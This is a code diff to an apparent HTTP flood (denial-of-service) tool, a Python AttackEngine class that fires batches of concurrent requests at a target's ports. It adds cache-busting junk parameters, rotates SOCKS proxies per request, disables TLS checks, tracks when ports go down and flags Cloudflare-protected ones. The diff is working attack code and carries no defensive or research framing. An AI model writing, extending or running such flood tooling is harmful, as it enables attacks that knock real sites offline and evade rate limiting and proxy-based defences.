@@ -2,6 +2,7 @@ import asyncio
 import random
 import string
 import time
+import traceback
 from typing import List, Optional
 from urllib.parse import urljoin, urlparse
 
@@ -71,7 +72,6 @@ def _pick_method(method: AttackMethod) -> str:
 
 def _build_url(target: str, port: int) -> str:
     parsed = urlparse(target)
-    scheme = parsed.scheme or "https"
     host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
     path = parsed.path or "/"
     if port == 443:
@@ -87,6 +87,7 @@ class AttackEngine:
         self.stats = AttackStats()
         self._stop_event = asyncio.Event()
         self._task: Optional[asyncio.Task] = None
+        self.last_error: str = ""
 
     @property
     def is_running(self) -> bool:
@@ -97,6 +98,7 @@ class AttackEngine:
             await self.stop()
 
         self._stop_event.clear()
+        self.last_error = ""
 
         port_stats = {}
         for p in ports:
@@ -134,8 +136,7 @@ class AttackEngine:
             t = asyncio.create_task(self._attack_port(target, port, method, threads_per_port, deadline, use_proxies))
             tasks.append(t)
 
-        # health checker — каждые 3 секунды проверяет какие порты мертвы и перераспределяет потоки
-        checker = asyncio.create_task(self._health_loop(target, ports, method, threads, deadline, use_proxies))
+        checker = asyncio.create_task(self._health_loop())
         tasks.append(checker)
 
         try:
@@ -144,7 +145,7 @@ class AttackEngine:
             pass
 
         if self.stats.status == AttackStatus.RUNNING:
-            if all(ps.status == PortStatus.DOWN for ps in self.stats.ports.values()):
+            if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                 self.stats.status = AttackStatus.ALL_DOWN
             else:
                 self.stats.status = AttackStatus.FINISHED
@@ -155,31 +156,25 @@ class AttackEngine:
         sem = asyncio.Semaphore(threads)
         timeout = aiohttp.ClientTimeout(total=settings.request_timeout)
 
-        connector = None
-        if use_proxies and proxy_pool.count > 0:
-            connector = proxy_pool.get_connector(settings.proxy_rotate)
-
         try:
-            async with aiohttp.ClientSession(
-                connector=connector or aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False),
-                timeout=timeout,
-            ) as session:
-                while not self._stop_event.is_set():
-                    if deadline and time.time() >= deadline:
-                        break
+            while not self._stop_event.is_set():
+                if deadline and time.time() >= deadline:
+                    break
 
-                    ps = self.stats.ports.get(port)
-                    if not ps or ps.status != PortStatus.ALIVE:
-                        await asyncio.sleep(1)
-                        continue
+                ps = self.stats.ports.get(port)
+                if not ps or ps.status != PortStatus.ALIVE:
+                    await asyncio.sleep(1)
+                    continue
 
-                    batch = [self._fire(session, url, port, method, sem) for _ in range(min(threads, 80))]
-                    await asyncio.gather(*batch, return_exceptions=True)
+                batch = [self._fire_one(url, port, method, sem, timeout, use_proxies) for _ in range(min(threads, 80))]
+                await asyncio.gather(*batch, return_exceptions=True)
 
         except asyncio.CancelledError:
             pass
+        except Exception as e:
+            self.last_error = f"Port {port}: {e}"
 
-    async def _fire(self, session: aiohttp.ClientSession, base_url: str, port: int, method: AttackMethod, sem: asyncio.Semaphore):
+    async def _fire_one(self, base_url: str, port: int, method: AttackMethod, sem: asyncio.Semaphore, timeout: aiohttp.ClientTimeout, use_proxies: bool):
         async with sem:
             if self._stop_event.is_set():
                 return
@@ -193,36 +188,52 @@ class AttackEngine:
             buster = f"{'&' if '?' in base_url else '?'}{_junk(3, 6)}={_junk(8, 16)}"
             url = base_url + buster
 
+            connector = None
+            session_owner = True
+
             try:
-                kwargs = {"method": chosen, "url": url, "headers": headers}
-                if chosen == "POST":
-                    kwargs["json"] = _build_payload()
+                if use_proxies and proxy_pool.count > 0:
+                    proxy_url = proxy_pool.random()
+                    if proxy_url:
+                        try:
+                            from aiohttp_socks import ProxyConnector
+                            connector = ProxyConnector.from_url(proxy_url)
+                        except Exception:
+                            connector = None
 
-                async with session.request(**kwargs) as resp:
-                    status = resp.status
-                    ps.total_requests += 1
-                    ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
-                    ps.last_response_time = time.time()
-                    self.stats.total_requests += 1
+                async with aiohttp.ClientSession(
+                    connector=connector or aiohttp.TCPConnector(limit=0, ssl=False),
+                    timeout=timeout,
+                ) as session:
+                    kwargs = {"method": chosen, "url": url, "headers": headers}
+                    if chosen == "POST":
+                        kwargs["json"] = _build_payload()
 
-                    if status < 400:
-                        ps.successful += 1
-                        ps.consecutive_fails = 0
-                        self.stats.successful += 1
-                    else:
-                        ps.failed += 1
-                        self.stats.failed += 1
+                    async with session.request(**kwargs) as resp:
+                        status = resp.status
+                        ps.total_requests += 1
+                        ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
+                        ps.last_response_time = time.time()
+                        self.stats.total_requests += 1
 
-                    if status >= 500:
-                        ps.consecutive_fails += 1
-                        if ps.consecutive_fails >= FAIL_THRESHOLD:
-                            ps.status = PortStatus.DOWN
+                        if status < 400:
+                            ps.successful += 1
+                            ps.consecutive_fails = 0
+                            self.stats.successful += 1
+                        else:
+                            ps.failed += 1
+                            self.stats.failed += 1
 
-                    if resp.headers.get("server", "").lower() == "cloudflare":
-                        ps.status = PortStatus.PROTECTED
+                        if status >= 500:
+                            ps.consecutive_fails += 1
+                            if ps.consecutive_fails >= FAIL_THRESHOLD:
+                                ps.status = PortStatus.DOWN
 
-                    if status == 429:
-                        await asyncio.sleep(random.uniform(1.0, 3.0))
+                        if resp.headers.get("server", "").lower() == "cloudflare":
+                            ps.status = PortStatus.PROTECTED
+
+                        if status == 429:
+                            await asyncio.sleep(random.uniform(1.0, 3.0))
 
             except (aiohttp.ClientError, asyncio.TimeoutError, OSError, ConnectionError):
                 ps.total_requests += 1
@@ -233,13 +244,15 @@ class AttackEngine:
 
                 if ps.consecutive_fails >= FAIL_THRESHOLD:
                     ps.status = PortStatus.DOWN
+            except Exception:
+                ps.total_requests += 1
+                ps.failed += 1
+                self.stats.total_requests += 1
+                self.stats.failed += 1
 
-    async def _health_loop(self, target: str, ports: List[int], method: AttackMethod, total_threads: int, deadline: float, use_proxies: bool):
+    async def _health_loop(self):
         while not self._stop_event.is_set():
             await asyncio.sleep(3)
-
-            if deadline and time.time() >= deadline:
-                break
 
             alive = self.stats.alive_ports
             if not alive:
